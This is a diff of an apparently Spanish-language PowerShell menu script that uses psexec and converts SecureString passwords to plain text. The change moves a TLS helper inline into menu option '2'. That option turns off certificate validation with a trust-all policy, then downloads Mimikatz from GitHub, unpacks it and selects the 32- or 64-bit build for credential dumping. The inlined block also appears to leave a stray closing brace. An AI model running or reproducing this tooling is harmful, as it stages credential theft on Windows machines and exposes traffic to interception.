@@ -37,20 +37,6 @@ function ConvertFrom-SecureToPlain {
     [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
     $PlainTextPassword }
 
-function EnableTLS {
-    add-type @"
-    using System.Net;
-    using System.Security.Cryptography.X509Certificates;
-    public class TrustAllCertsPolicy : ICertificatePolicy {
-    public bool CheckValidationResult(
-    ServicePoint srvPoint, X509Certificate certificate,
-    WebRequest request, int certificateProblem) {
-    return true; }}
-"@  $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
-    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
-    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
-
-
     do { 
     Show-Menu
     $input = Read-Host -Prompt "Elige la opción que más te interese"
@@ -74,12 +60,23 @@ function EnableTLS {
         del .\psexec.exe }
 
         '2' {
+	add-type @"
+        using System.Net;
+        using System.Security.Cryptography.X509Certificates;
+        public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+        ServicePoint srvPoint, X509Certificate certificate,
+        WebRequest request, int certificateProblem) {
+        return true; }}
+"@      $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+        [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
 	Write-Host ""
         Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 1500
         Write-Host ""
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
-	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
+	Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
